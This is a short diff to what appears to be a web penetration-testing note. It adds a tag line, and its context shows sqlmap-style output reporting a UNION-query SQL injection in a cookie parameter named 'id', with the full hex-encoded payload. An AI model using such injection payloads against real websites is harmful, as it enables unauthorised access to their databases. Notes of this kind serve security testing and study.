@@ -22,6 +22,7 @@ Parameter: id (Cookie)
     Type: UNION query
     Title: Generic UNION query (NULL) - 2 columns
     Payload: id=-5888 UNION ALL SELECT CONCAT(0x7162786b71,0x7878714d716972454578746451454d494c636f62545556576b504b4f7976505651705a416f514a63,0x7170767871),NULL-- -
+tags: [web渗透]
 ---
 ```
 
